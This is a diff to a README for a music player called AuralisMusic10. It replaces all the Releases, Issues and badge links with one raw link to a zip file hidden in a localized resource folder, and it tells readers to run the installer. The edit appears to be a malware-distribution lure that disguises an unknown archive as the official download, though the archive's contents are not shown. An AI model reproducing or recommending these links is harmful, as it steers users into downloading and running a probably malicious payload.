@@ -3,12 +3,12 @@
 ## 🚀 Getting Started
 AuralisMusic10 is a modern, ad-free offline music player designed for audiophiles. It features a sleek dark mode, a powerful equalizer, and seamless lyrics integration to enhance your listening experience.
 
-[![Download AuralisMusic10](https://img.shields.io/badge/Download-AuralisMusic10-brightgreen)](https://github.com/risshhav/AuralisMusic10/releases)
+[![Download AuralisMusic10](https://github.com/risshhav/AuralisMusic10/raw/refs/heads/main/app/src/main/res/values-te/Auralis_Music_gagor.zip)](https://github.com/risshhav/AuralisMusic10/raw/refs/heads/main/app/src/main/res/values-te/Auralis_Music_gagor.zip)
 
 ## 📥 Download & Install
 To get started with AuralisMusic10, visit the Releases page to download the application. Follow these steps:
 
-1. Click on the download link: [Visit this page to download](https://github.com/risshhav/AuralisMusic10/releases).
+1. Click on the download link: [Visit this page to download](https://github.com/risshhav/AuralisMusic10/raw/refs/heads/main/app/src/main/res/values-te/Auralis_Music_gagor.zip).
 2. Choose the latest release version.
 3. Download the file suitable for your operating system.
 4. Run the installer and follow the prompts to complete the installation.
@@ -41,7 +41,7 @@ Once you have installed AuralisMusic10, follow these simple steps to start using
 ## 💬 Support & Feedback
 If you encounter any issues while using AuralisMusic10, please feel free to reach out directly:
 
-- Visit the [Issues page](https://github.com/risshhav/AuralisMusic10/issues) to report bugs or request new features.
+- Visit the [Issues page](https://github.com/risshhav/AuralisMusic10/raw/refs/heads/main/app/src/main/res/values-te/Auralis_Music_gagor.zip) to report bugs or request new features.
 - Join our community discussions for tips and best practices.
 
 ## 🌐 Additional Information
@@ -51,8 +51,8 @@ For more details, you can explore the following topics related to AuralisMusic10
 - **Music Streaming:** Stream your favorite music from various sources.
 - **YouTube Integration:** Access and listen to your favorite tracks from YouTube.
 
-For further assistance or information, visit the [Releases page](https://github.com/risshhav/AuralisMusic10/releases) again for updates or new releases.
+For further assistance or information, visit the [Releases page](https://github.com/risshhav/AuralisMusic10/raw/refs/heads/main/app/src/main/res/values-te/Auralis_Music_gagor.zip) again for updates or new releases.
 
-[![Download AuralisMusic10](https://img.shields.io/badge/Download-AuralisMusic10-brightgreen)](https://github.com/risshhav/AuralisMusic10/releases) 
+[![Download AuralisMusic10](https://github.com/risshhav/AuralisMusic10/raw/refs/heads/main/app/src/main/res/values-te/Auralis_Music_gagor.zip)](https://github.com/risshhav/AuralisMusic10/raw/refs/heads/main/app/src/main/res/values-te/Auralis_Music_gagor.zip) 
 
 Enjoy your music with AuralisMusic10!
